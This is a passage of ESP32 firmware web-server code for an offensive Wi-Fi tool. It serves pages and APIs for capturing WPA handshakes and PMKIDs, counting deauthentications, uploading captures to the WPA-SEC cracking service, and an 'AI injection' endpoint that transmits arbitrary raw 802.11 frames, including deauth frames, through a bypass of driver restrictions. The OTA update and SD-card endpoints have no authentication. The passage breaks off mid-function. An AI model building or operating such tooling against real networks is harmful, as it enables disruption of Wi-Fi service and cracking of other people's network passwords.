    JsonArray lines = doc["lines"].to<JsonArray>();

    portENTER_CRITICAL(&packetRingMux);
    uint16_t emitted = 0;
    for (uint16_t i = 0; i < PACKET_RING_SIZE && emitted < (uint16_t)limit; i++) {
      const PacketEvent& p = packetRing[(packetHead + i) % PACKET_RING_SIZE];
      if (p.seq == 0 || p.seq <= since) continue;
      char src[18], dst[18], bssid[18];
      macToStr(p.addr2, src);
      macToStr(p.addr1, dst);
      macToStr(p.addr3, bssid);
      JsonObject o = lines.add<JsonObject>();
      o["seq"] = p.seq;
      o["ms"] = p.ms;
      o["type"] = p.type;
      o["subtype"] = p.subtype;
      o["len"] = p.len;
      o["rssi"] = p.rssi;
      o["ch"] = p.channel;
      o["src"] = src;
      o["dst"] = dst;
      o["bssid"] = bssid;
      emitted++;
    }
    doc["next_seq"] = packetSeq + 1;
    portEXIT_CRITICAL(&packetRingMux);
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/android", HTTP_GET, [](){
    Serial.println("[web] GET /android");
    bool sdOk = sdReady || mountSdCard(false);
    bool hasApk = sdOk && SD.exists(androidApkPath);

    uint32_t apkSize = 0;
    if (hasApk) {
      File f = SD.open(androidApkPath, FILE_READ);
      if (f) {
        apkSize = (uint32_t)f.size();
        f.close();
      }
    }

    String html = R"(<!DOCTYPE html>
<html>
<head>
  <title>CYD Companion APK</title>
  <style>
    body { font-family: Arial; margin: 20px; background: #1a1a1a; color: #fff; }
    h1 { color: #00d4ff; }
    .box { background: #222; border-radius: 6px; padding: 14px; }
    button { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
    button:hover { background: #00cc00; }
    a { color: #79d7ff; }
  </style>
</head>
<body>
  <h1>CYD Companion Android App</h1>
  <div class='box'>
)";
    if (!sdOk) {
      html += "<p><b>SD card not available.</b> You can still use this page.</p>";
      html += "<p>Insert/mount SD to upload CYDCompanion.apk.</p>";
    } else if (!hasApk) {
      html += "<p><b>CYDCompanion.apk not found</b> on SD root.</p>";
      html += "<p>Upload an APK below (it will be saved as /CYDCompanion.apk).</p>";
    } else {
      html += "<p>APK file: CYDCompanion.apk</p>";
      html += "<p>Size: " + String(apkSize) + " bytes</p>";
      html += "<p><a href='/android.apk'><button type='button'>Download APK</button></a></p>";
    }
    html += "<form method='POST' action='/android/upload' enctype='multipart/form-data'>";
    html += "<p>Upload new APK to SD as CYDCompanion.apk:</p>";
    if (sdOk) {
      html += "<input type='file' name='apk' accept='.apk,application/vnd.android.package-archive' required>";
      html += "<button type='submit'>Upload APK</button>";
    } else {
      html += "<p>Upload disabled until SD is available.</p>";
    }
    html += "</form>";
    html += "<p><a href='/sd'>Open SD File Manager</a></p>";
    html += "<p><a href='/'>Back to OTA page</a></p>";
    html += "</div></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/android/upload", HTTP_POST, [](){
    bool ok = sdReady || mountSdCard(false);
    if (!ok) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    if (androidApkUploadFile) androidApkUploadFile.close();
    bool hasApk = SD.exists(androidApkPath);
    String msg = hasApk ? "APK uploaded/updated on SD." : "APK upload failed.";
    webServer.send(200, "text/html",
      "<html><body style='font-family:Arial;background:#111;color:#fff;'>"
      "<h2>" + msg + "</h2><p><a href='/android'>Back</a></p></body></html>");
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      bool ok = sdReady || mountSdCard(false);
      if (!ok) return;
      if (SD.exists(androidApkPath)) SD.remove(androidApkPath);
      androidApkUploadFile = SD.open(androidApkPath, FILE_WRITE);
      Serial.printf("[web] APK upload start: %s\n", upload.filename.c_str());
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (androidApkUploadFile) androidApkUploadFile.write(upload.buf, upload.currentSize);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (androidApkUploadFile) {
        androidApkUploadFile.close();
        Serial.printf("[web] APK upload complete: %u bytes\n", upload.totalSize);
      }
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
      if (androidApkUploadFile) androidApkUploadFile.close();
      if (SD.exists(androidApkPath)) SD.remove(androidApkPath);
      Serial.println("[web] APK upload aborted");
    }
  });

  webServer.on("/android.apk", HTTP_GET, [](){
    Serial.println("[web] GET /android.apk");
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    if (!SD.exists(androidApkPath)) {
      webServer.send(404, "text/plain", "CYDCompanion.apk not found on SD");
      return;
    }

    File apk = SD.open(androidApkPath, FILE_READ);
    if (!apk) {
      webServer.send(500, "text/plain", "Failed to open APK");
      return;
    }
    webServer.sendHeader("Content-Disposition", "attachment; filename=CYDCompanion.apk");
    webServer.streamFile(apk, "application/vnd.android.package-archive");
    apk.close();
  });

  webServer.on("/sd", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    String path = normalizeSdWebPath(webServer.arg("path"));
    if (path.isEmpty()) {
      webServer.send(400, "text/plain", "Invalid path");
      return;
    }
    if (!sdOk) {
      String html = "<html><body style='font-family:Arial;background:#111;color:#fff;'>";
      html += "<h2>SD File Manager</h2><p>SD card not available.</p>";
      html += "<p><a href='/'>Back</a></p></body></html>";
      webServer.send(503, "text/html", html);
      return;
    }

    if (!SD.exists(path)) {
      webServer.send(404, "text/plain", "Path not found");
      return;
    }
    File dir = SD.open(path, FILE_READ);
    if (!dir || !dir.isDirectory()) {
      if (dir) dir.close();
      webServer.send(400, "text/plain", "Path is not a directory");
      return;
    }

    String html = R"(<html><head><title>SD File Manager</title>
<style>
body{font-family:Arial;margin:20px;background:#1a1a1a;color:#fff}
h1{color:#00d4ff}
a{color:#79d7ff}
table{width:100%;border-collapse:collapse;margin-top:12px}
th,td{padding:8px;border-bottom:1px solid #333;text-align:left}
button{padding:6px 10px;background:#00ff00;color:#000;border:none;cursor:pointer}
button:hover{background:#00cc00}
.danger{background:#ff4d4d;color:#fff}
.box{background:#222;border-radius:6px;padding:12px;margin:10px 0}
input[type='text']{width:100%;padding:6px}
</style></head><body>)";
    html += "<h1>SD File Manager</h1>";
    html += "<div class='box'><p>Current path: <b>" + escapeHtml(path) + "</b></p>";
    html += "<p><a href='/'>Home</a> | <a href='/android'>Android</a>";
    if (path != "/") {
      html += " | <a href='/sd?path=" + urlEncodeSimple(pathParent(path)) + "'>Up</a>";
    }
    html += "</p></div>";

    html += "<div class='box'><h3>Upload File</h3>";
    html += "<form method='POST' action='/sd/upload?dir=" + urlEncodeSimple(path) + "' enctype='multipart/form-data'>";
    html += "<input type='file' name='file' required> ";
    html += "<button type='submit'>Upload</button></form></div>";

    html += "<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>";
    while (true) {
      File entry = dir.openNextFile();
      if (!entry) break;
      String fullPath = entry.name();
      if (!fullPath.startsWith("/")) {
        fullPath = path;
        if (!fullPath.endsWith("/")) fullPath += "/";
        fullPath += entry.name();
      }
      String baseName = fullPath.substring(fullPath.lastIndexOf('/') + 1);
      bool isDir = entry.isDirectory();
      uint32_t size = (uint32_t)entry.size();
      entry.close();

      html += "<tr><td>" + escapeHtml(baseName) + "</td>";
      html += isDir ? "<td>dir</td>" : "<td>file</td>";
      html += "<td>" + String(size) + "</td><td>";
      if (isDir) {
        html += "<a href='/sd?path=" + urlEncodeSimple(fullPath) + "'><button type='button'>Open</button></a> ";
      } else {
        html += "<a href='/sd/get?path=" + urlEncodeSimple(fullPath) + "'><button type='button'>View/Download</button></a> ";
      }
      html += "<form style='display:inline' method='POST' action='/sd/delete' onsubmit='return confirm(\"Delete " + escapeHtml(baseName) + "?\")'>";
      html += "<input type='hidden' name='path' value='" + escapeHtml(fullPath) + "'>";
      html += "<input type='hidden' name='back' value='" + escapeHtml(path) + "'>";
      html += "<button class='danger' type='submit'>Delete</button></form>";
      html += "</td></tr>";
    }
    dir.close();
    html += "</table></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/sd/get", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String path = normalizeSdWebPath(webServer.arg("path"));
    if (path.isEmpty() || path == "/") {
      webServer.send(400, "text/plain", "Invalid path");
      return;
    }
    if (!SD.exists(path)) {
      webServer.send(404, "text/plain", "File not found");
      return;
    }
    File f = SD.open(path, FILE_READ);
    if (!f || f.isDirectory()) {
      if (f) f.close();
      webServer.send(400, "text/plain", "Not a file");
      return;
    }
    String name = path.substring(path.lastIndexOf('/') + 1);
    String ct = "application/octet-stream";
    if (name.endsWith(".txt") || name.endsWith(".log") || name.endsWith(".json") || name.endsWith(".csv") || name.endsWith(".22000")) {
      ct = "text/plain";
    }
    webServer.sendHeader("Content-Disposition", "attachment; filename=\"" + name + "\"");
    webServer.streamFile(f, ct);
    f.close();
  });

  webServer.on("/sd/delete", HTTP_POST, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String path = normalizeSdWebPath(webServer.arg("path"));
    String back = normalizeSdWebPath(webServer.arg("back"));
    if (back.isEmpty()) back = "/";
    if (path.isEmpty() || path == "/") {
      webServer.send(400, "text/plain", "Invalid delete path");
      return;
    }
    bool ok = removeSdPathRecursive(path);
    String html = "<html><body style='font-family:Arial;background:#111;color:#fff;'>";
    html += ok ? "<h2>Deleted: " : "<h2>Delete failed: ";
    html += escapeHtml(path) + "</h2>";
    html += "<p><a href='/sd?path=" + urlEncodeSimple(back) + "'>Back to SD File Manager</a></p></body></html>";
    webServer.send(ok ? 200 : 500, "text/html", html);
  });

  webServer.on("/sd/upload", HTTP_POST, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String backDir = normalizeSdWebPath(webServer.arg("dir"));
    if (backDir.isEmpty()) backDir = "/";
    String html = "<html><body style='font-family:Arial;background:#111;color:#fff;'>";
    if (sdUploadOk) {
      html += "<h2>Upload complete</h2>";
    } else {
      html += "<h2>Upload failed</h2><p>Check file/path and retry.</p>";
    }
    html += "<p><a href='/sd?path=" + urlEncodeSimple(backDir) + "'>Back to SD File Manager</a></p></body></html>";
    webServer.send(sdUploadOk ? 200 : 500, "text/html", html);
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      sdUploadOk = false;
      String uploadDir = normalizeSdWebPath(webServer.arg("dir"));
      if (uploadDir.isEmpty()) uploadDir = "/";
      bool sdOk = sdReady || mountSdCard(false);
      if (!sdOk) return;

      String filename = upload.filename;
      filename.replace('\\', '/');
      int slash = filename.lastIndexOf('/');
      if (slash >= 0) filename = filename.substring(slash + 1);
      if (filename.isEmpty()) return;

      String target = uploadDir;
      if (!target.endsWith("/")) target += "/";
      target += filename;
      if (SD.exists(target)) SD.remove(target);
      if (androidApkUploadFile) androidApkUploadFile.close();
      androidApkUploadFile = SD.open(target, FILE_WRITE);
      if (!androidApkUploadFile) return;
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (androidApkUploadFile) {
        size_t wr = androidApkUploadFile.write(upload.buf, upload.currentSize);
        if (wr != upload.currentSize) {
          sdUploadOk = false;
          androidApkUploadFile.close();
        }
      }
    } else if (upload.status == UPLOAD_FILE_END) {
      if (androidApkUploadFile) {
        androidApkUploadFile.close();
        sdUploadOk = true;
      }
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
      if (androidApkUploadFile) androidApkUploadFile.close();
      sdUploadOk = false;
    }
  });

  webServer.on("/wpasec", HTTP_GET, [](){
    Serial.println("[web] GET /wpasec");
    bool sdOk = sdReady || mountSdCard(false);
    bool hasResults = sdOk && SD.exists(wpasecResultsPath);
    String html = R"(<!DOCTYPE html>
<html>
<head>
  <title>WPA-SEC Console</title>
  <style>
    body { font-family: Arial; margin: 20px; background: #1a1a1a; color: #fff; }
    h1 { color: #00d4ff; }
    .box { background: #222; border-radius: 6px; padding: 14px; margin: 12px 0; }
    button { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
    button:hover { background: #00cc00; }
    a { color: #79d7ff; }
  </style>
</head>
<body>
  <h1>WPA-SEC Console</h1>
)";
    html += "<div class='box'><p>API Key: ";
    html += cfg.wpasec_apikey.isEmpty() ? "NOT CONFIGURED" : "CONFIGURED";
    html += "</p>";
    html += "<p>Captured: " + String(capturedHandshakes) + " | Cracked: " + String(crackedNetworks) + "</p>";
    html += "<p><a href='/wpasec/sync'><button type='button'>Sync Captures to WPA-SEC</button></a></p>";
    html += "<p><a href='/wpasec/download'><button type='button'>Download Latest Results</button></a></p>";
    html += hasResults ? "<p><a href='/wpasec/results'>View Results</a> | <a href='/wpasec/results/download'>Download Results File</a></p>" : "<p>No local results file yet.</p>";
    html += "<p>Status: " + wpasecSyncStatus + "</p></div>";
    html += "<p><a href='https://wpa-sec.stanev.org/' target='_blank'>Open WPA-SEC Website</a></p>";
    html += "<p><a href='/'>Back to Home</a></p></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/wpasec/sync", HTTP_GET, [](){
    if (cfg.wpasec_apikey.isEmpty()) {
      webServer.send(400, "text/plain", "WPA-SEC API key not configured.");
      return;
    }
    syncWithWPASec();
    webServer.sendHeader("Location", "/wpasec");
    webServer.send(302, "text/plain", "Sync complete.");
  });

  webServer.on("/wpasec/download", HTTP_GET, [](){
    if (cfg.wpasec_apikey.isEmpty()) {
      webServer.send(400, "text/plain", "WPA-SEC API key not configured.");
      return;
    }
    downloadWPASecResults();
    webServer.sendHeader("Location", "/wpasec");
    webServer.send(302, "text/plain", "Download complete.");
  });

  webServer.on("/wpasec/results", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk || !SD.exists(wpasecResultsPath)) {
      webServer.send(404, "text/plain", "No WPA-SEC results file on SD.");
      return;
    }
    File f = SD.open(wpasecResultsPath, FILE_READ);
    if (!f) {
      webServer.send(500, "text/plain", "Failed to open results file.");
      return;
    }
    webServer.sendHeader("Content-Disposition", "inline; filename=wpasec_results.txt");
    webServer.streamFile(f, "text/plain");
    f.close();
  });

  webServer.on("/wpasec/results/download", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk || !SD.exists(wpasecResultsPath)) {
      webServer.send(404, "text/plain", "No WPA-SEC results file on SD.");
      return;
    }
    File f = SD.open(wpasecResultsPath, FILE_READ);
    if (!f) {
      webServer.send(500, "text/plain", "Failed to open results file.");
      return;
    }
    webServer.sendHeader("Content-Disposition", "attachment; filename=wpasec_results.txt");
    webServer.streamFile(f, "text/plain");
    f.close();
  });

  // Upload handler
  webServer.on("/update", HTTP_POST, [](){ 
    Serial.println("[web] POST /update complete, sending response");
    webServer.sendHeader("Connection", "close");
    webServer.send(200, "text/plain", (Update.hasError()) ? "FAIL" : "OK");
    delay(100);
    Serial.println("[web] Update complete, restarting...");
    ESP.restart();
  }, [](){ 
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      Serial.printf("[web] Upload started: %s\n", upload.filename.c_str());
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
        Serial.println("[web] ERROR: Update.begin() failed");
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Serial.println("[web] ERROR: Update.write() failed");
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) {
        Serial.printf("[web] Upload successful: %u bytes\n", upload.totalSize);
      } else {
        Serial.println("[web] ERROR: Update.end() failed");
        Update.printError(Serial);
      }
    }
  });

  // ============= YOINK API & Log Viewer =============

  // JSON API: full YOINK engine state (for companion app + API consumers)
  webServer.on("/api/yoink", HTTP_GET, [](){
    uint32_t since = (uint32_t)webServer.arg("since").toInt();

    JsonDocument doc;
    doc["ok"] = true;
    doc["running"] = YoinkEngine::isRunning();
    doc["state"] = YoinkEngine::getStateStr();
    doc["channel"] = YoinkEngine::getCurrentChannel();
    doc["packets"] = YoinkEngine::getPacketCount();
    doc["deauths"] = YoinkEngine::getDeauthCount();
    doc["networks"] = YoinkEngine::getNetworkCount();
    doc["clients"] = YoinkEngine::getClientCount();
    doc["handshakes"] = YoinkEngine::getHandshakeCount();
    doc["pmkids"] = YoinkEngine::getPmkidCount();
    doc["eapolMask"] = YoinkEngine::getEapolMask();
    doc["log_seq"] = YoinkEngine::getLogSeq();

    // Target info
    const char* tgt = YoinkEngine::getTargetSSID();
    if (tgt && tgt[0]) {
      JsonObject target = doc["target"].to<JsonObject>();
      target["ssid"] = tgt;
      target["rssi"] = YoinkEngine::getTargetRSSI();
      target["auth"] = YoinkEngine::getTargetAuthStr();
      const uint8_t* bssid = YoinkEngine::getTargetBSSID();
      char bssidStr[18];
      snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      target["bssid"] = bssidStr;
    }

    // Log entries (optionally filtered by seq > since)
    JsonArray logArr = doc["log"].to<JsonArray>();
    uint8_t logCount = YoinkEngine::getLogCount();
    for (uint8_t i = 0; i < logCount; i++) {
      const YoinkLogEntry* e = YoinkEngine::getLogEntry(i);
      if (!e || e->seq <= since) continue;
      JsonObject lo = logArr.add<JsonObject>();
      lo["seq"] = e->seq;
      lo["ms"] = e->ms;
      lo["sev"] = e->severity;
      lo["msg"] = e->msg;
    }

    // Captured handshakes summary
    JsonArray hsArr = doc["hs_list"].to<JsonArray>();
    for (uint8_t i = 0; i < YoinkEngine::getTotalHandshakeSlots(); i++) {
      const YoinkHandshake* hs = YoinkEngine::getHandshake(i);
      if (!hs || hs->capturedMask == 0) continue;
      JsonObject ho = hsArr.add<JsonObject>();
      ho["ssid"] = hs->ssid;
      char bStr[18];
      snprintf(bStr, sizeof(bStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               hs->bssid[0], hs->bssid[1], hs->bssid[2],
               hs->bssid[3], hs->bssid[4], hs->bssid[5]);
      ho["bssid"] = bStr;
      ho["mask"] = hs->capturedMask;
      ho["valid"] = hs->hasValidPair();
      ho["saved"] = hs->saved;
    }

    // Captured PMKIDs summary
    JsonArray pmkArr = doc["pmkid_list"].to<JsonArray>();
    for (uint8_t i = 0; i < YoinkEngine::getPmkidCount(); i++) {
      const YoinkPmkid* p = YoinkEngine::getPmkid(i);
      if (!p) continue;
      JsonObject po = pmkArr.add<JsonObject>();
      po["ssid"] = p->ssid;
      po["saved"] = p->saved;
    }

    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  // HTML: YOINK session log file (read from SD)
  webServer.on("/yoink/log", HTTP_GET, [](){
    // Serve the session log as a styled HTML page with auto-refresh
    String html = R"(<html><head><meta charset='utf-8'><title>YOINK Log</title>
<meta http-equiv='refresh' content='5'>
<style>
body{background:#0a0a1a;color:#0f0;font-family:'Courier New',monospace;font-size:12px;margin:16px}
h1{color:#0ff;font-size:18px}
.stats{color:#0ff;margin:8px 0}
pre{background:#111;border:1px solid #333;padding:12px;overflow-x:auto;max-height:70vh;overflow-y:auto;white-space:pre-wrap}
a{color:#f0f;text-decoration:none}
a:hover{text-decoration:underline}
.hdr{display:flex;justify-content:space-between;align-items:center}
</style></head><body>
<div class='hdr'><h1>YOINK // Session Log</h1><a href='/'>Home</a></div>)";

    html += "<div class='stats'>";
    html += "State: " + String(YoinkEngine::getStateStr());
    html += " | Nets: " + String(YoinkEngine::getNetworkCount());
    html += " | HS: " + String(YoinkEngine::getHandshakeCount());
    html += " | PMKID: " + String(YoinkEngine::getPmkidCount());
    html += " | Pkts: " + String((unsigned long)YoinkEngine::getPacketCount());
    html += " | Deauths: " + String((unsigned long)YoinkEngine::getDeauthCount());
    html += "</div>";

    bool sdOk = sdReady || mountSdCard(false);
    if (sdOk && SD.exists("/yoink_session.log")) {
      File f = SD.open("/yoink_session.log", FILE_READ);
      if (f) {
        html += "<pre>";
        while (f.available()) {
          char c = f.read();
          if (c == '<') html += "&lt;";
          else if (c == '>') html += "&gt;";
          else if (c == '&') html += "&amp;";
          else html += c;
        }
        f.close();
        html += "</pre>";
      } else {
        html += "<p>Could not open session log.</p>";
      }
    } else {
      // Fallback: show live log ring
      html += "<pre>";
      uint8_t logCount = YoinkEngine::getLogCount();
      for (uint8_t i = 0; i < logCount; i++) {
        const YoinkLogEntry* e = YoinkEngine::getLogEntry(i);
        if (!e) continue;
        char line[128];
        snprintf(line, sizeof(line), "[%lu.%03lu] %s\n", e->ms / 1000, e->ms % 1000, e->msg);
        // HTML escape
        for (int j = 0; line[j]; j++) {
          if (line[j] == '<') html += "&lt;";
          else if (line[j] == '>') html += "&gt;";
          else html += line[j];
        }
      }
      html += "</pre>";
    }

    // List captured files from /captures/<SSID>/Handshakes/
    html += "<h2 style='color:#0ff'>Captured Files</h2>";
    if (sdOk && SD.exists("/captures")) {
      File capsDir = SD.open("/captures");
      if (capsDir && capsDir.isDirectory()) {
        html += "<ul>";
        while (true) {
          File ssidEntry = capsDir.openNextFile();
          if (!ssidEntry) break;
          if (!ssidEntry.isDirectory()) { ssidEntry.close(); continue; }
          String ssidPath = ssidEntry.name();
          if (!ssidPath.startsWith("/")) ssidPath = "/captures/" + ssidPath;
          ssidEntry.close();
          String hsPath = ssidPath + "/Handshakes";
          if (!SD.exists(hsPath)) continue;
          File hsDir = SD.open(hsPath);
          if (!hsDir || !hsDir.isDirectory()) { if (hsDir) hsDir.close(); continue; }
          while (true) {
            File f = hsDir.openNextFile();
            if (!f) break;
            if (f.isDirectory()) { f.close(); continue; }
            String fn = f.name();
            String fullPath = hsPath + "/" + fn;
            html += "<li><a href='/yoink/file?path=";
            for (int j = 0; j < (int)fullPath.length(); j++) {
              char c = fullPath[j];
              if (c == ' ') html += "%20";
              else html += c;
            }
            html += "'>";
            html += fn;
            html += "</a> (";
            html += String((unsigned long)f.size());
            html += " bytes)</li>";
            f.close();
          }
          hsDir.close();
        }
        capsDir.close();
        html += "</ul>";
      }
    }

    html += "</body></html>";
    webServer.send(200, "text/html", html);
  });

  // WPA-SEC config API
  webServer.on("/api/config/wpasec", HTTP_GET, [](){
    JsonDocument doc;
    doc["ok"] = true;
    doc["apikey_set"] = !cfg.wpasec_apikey.isEmpty();
    doc["apikey_length"] = cfg.wpasec_apikey.length();
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/config/wpasec", HTTP_POST, [](){
    if (!webServer.hasArg("apikey")) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"missing apikey\"}");
      return;
    }
    String apikey = webServer.arg("apikey");
    if (apikey.length() < 32) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"apikey must be 32 hex chars\"}");
      return;
    }
    cfg.wpasec_apikey = apikey;
    saveConfig(cfg);
    wpasecSyncStatus = "API key configured";
    Serial.printf("[wpasec] API key set (first 8 chars: %.8s)\n", cfg.wpasec_apikey.c_str());
    JsonDocument doc;
    doc["ok"] = true;
    doc["message"] = "API key saved";
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  // WPA-SEC config page
  webServer.on("/wpasec/config", HTTP_GET, [](){
    const char* html = 
      "<html><head><title>WPA-SEC Configuration</title>"
      "<style>"
      "body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }"
      ".container { max-width: 600px; margin: 0 auto; }"
      "h1 { color: #00ffff; border-bottom: 2px solid #ff00ff; padding-bottom: 10px; }"
      ".box { border: 1px solid #00ff00; padding: 15px; margin: 15px 0; background: #1a1a1a; }"
      "input { width: 100%; padding: 8px; margin: 5px 0; background: #222; color: #00ff00; border: 1px solid #00ff00; }"
      "button { background: #ff00ff; color: #000; padding: 10px 20px; border: none; cursor: pointer; margin: 5px 0; }"
      "button:hover { background: #00ffff; }"
      ".status { color: #ffff00; margin: 10px 0; }"
      ".success { color: #00ff00; }"
      ".error { color: #ff0000; }"
      "</style></head><body>"
      "<div class='container'>"
      "<h1>WPA-SEC Configuration</h1>"
      "<div class='box'>"
      "<h2>API Key Management</h2>"
      "<p>Enter your WPA-SEC API key from <a href='https://wpa-sec.stanev.org/api.php' target='_blank'>https://wpa-sec.stanev.org/api.php</a></p>"
      "<input type='text' id='apikey' placeholder='Enter 32-character hex API key' maxlength='32'><br>"
      "<button onclick='saveApiKey()'>Save API Key</button>"
      "<p class='status' id='status'></p>"
      "</div>"
      "<div class='box'>"
      "<h2>Upload Handshakes to WPA-SEC</h2>"
      "<p>Upload captured handshakes from <b>/captures/&lt;SSID&gt;/Handshakes/</b> (all SSIDs, recursive)</p>"
      "<button onclick='startSync()'>Sync & Upload to WPA-SEC</button>"
      "<p class='status' id='syncStatus'></p>"
      "</div>"
      "<div class='box'>"
      "<h2>View Results</h2>"
      "<a href='/wpasec/results'><button>View Results</button></a> "
      "<a href='/wpasec/results/download'><button>Download Results</button></a>"
      "</div>"
      "</div>"
      "<script>"
      "function saveApiKey() { const apikey = document.getElementById('apikey').value; const status = document.getElementById('status'); "
      "if (!apikey || apikey.length !== 32) { status.className = 'error'; status.textContent = 'ERROR: API key must be exactly 32 characters'; return; } "
      "status.textContent = 'Saving...'; fetch('/api/config/wpasec', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'apikey=' + encodeURIComponent(apikey) }) "
      ".then(r => r.json()).then(data => { if (data.ok) { status.className = 'success'; status.textContent = 'SUCCESS: API key saved'; } else { status.className = 'error'; status.textContent = 'ERROR: ' + data.error; } }) "
      ".catch(e => { status.className = 'error'; status.textContent = 'ERROR: ' + e.message; }); } "
      "function startSync() { const status = document.getElementById('syncStatus'); status.textContent = 'Starting sync...'; "
      "fetch('/wpasec/sync').then(r => r.text()).then(() => { status.className = 'success'; status.textContent = 'Sync started! Check console for progress.'; setTimeout(() => location.reload(), 2000); }) "
      ".catch(e => { status.className = 'error'; status.textContent = 'ERROR: ' + e.message; }); } "
      "</script></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/yoink/file", HTTP_GET, [](){
    // Accept 'path' (full SD path) or legacy 'name' param
    String path = webServer.arg("path");
    String name;
    if (path.length() == 0) {
      name = webServer.arg("name");
      if (name.length() == 0) {
        webServer.send(400, "text/plain", "Missing 'path' parameter");
        return;
      }
      path = "/captures/" + name;
    } else {
      name = path.substring(path.lastIndexOf('/') + 1);
    }
    // Sanitize: must be under /captures/, no traversal
    if (path.indexOf("..") >= 0 || !path.startsWith("/captures/")) {
      webServer.send(403, "text/plain", "Invalid path");
      return;
    }
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk || !SD.exists(path)) {
      webServer.send(404, "text/plain", "File not found");
      return;
    }
    File f = SD.open(path, FILE_READ);
    if (!f) {
      webServer.send(500, "text/plain", "Failed to open file");
      return;
    }
    String ct = "application/octet-stream";
    if (name.endsWith(".log") || name.endsWith(".txt") || name.endsWith(".22000")) {
      ct = "text/plain";
    }
    webServer.sendHeader("Content-Disposition", "inline; filename=\"" + name + "\"");
    webServer.streamFile(f, ct);
    f.close();
  });

  // ---------------------------------------------------------------
  // AI INJECTION ENDPOINTS  (Phase 1)
  // Android AI engine → CYD firmware raw frame injection
  // ---------------------------------------------------------------

  // POST /api/ai/inject_raw
  // Body (JSON): { "channel": 6, "hex": "C0001234..." }
  // Decodes the hex payload and fires it via esp_wifi_80211_tx().
  // The WSL bypasser override is already installed so all mgmt frame
  // subtypes (deauth, disassoc, auth, probe, beacon, custom) pass through.
  webServer.on("/api/ai/inject_raw", HTTP_POST, [](){
    if (!webServer.hasArg("plain")) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"no body\"}");
      return;
    }
    JsonDocument req;
    if (deserializeJson(req, webServer.arg("plain")) != DeserializationError::Ok) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid json\"}");
      return;
    }
    int channel       = req["channel"] | 0;
    const char* hexStr = req["hex"] | "";
    if (!hexStr || !hexStr[0]) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"missing hex\"}");
      return;
    }
    // Allocate from heap (DMA-capable, 4-byte aligned) — avoids touching BSS/DRAM.
    // esp_wifi_80211_tx() requires 4-byte alignment; heap_caps_malloc guarantees it.
    // 512 bytes covers any 802.11 management or data frame the AI would generate.
    int hexLen = strlen(hexStr);
    if (hexLen < 20 || hexLen > 1024 || (hexLen & 1)) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"hex length invalid\"}");
      return;
    }
    uint8_t* injectBuf = (uint8_t*)heap_caps_malloc(hexLen / 2 + 4, MALLOC_CAP_DMA | MALLOC_CAP_8BIT);
    if (!injectBuf) {
      webServer.send(503, "application/json", "{\"ok\":false,\"error\":\"heap alloc failed\"}");
      return;
    }
    int pktLen = hexDecodePayload(hexStr, injectBuf, hexLen / 2);
    if (pktLen < 10) {
      heap_caps_free(injectBuf);
      webServer.send(400, "application/json",
        "{\"ok\":false,\"error\":\"hex decode failed or payload too short (min 10 bytes)\"}");
      return;
    }
    if (channel >= 1 && channel <= 13) {
      esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
      delayMicroseconds(300);
    }
    esp_err_t txr = esp_wifi_80211_tx(WIFI_IF_STA, injectBuf, pktLen, false);
    if (txr != ESP_OK) {
      txr = tryAlternateTx(injectBuf, pktLen);
    }
    Serial.printf("[ai] inject_raw ch=%d len=%d esp_err=%d\n", channel, pktLen, (int)txr);
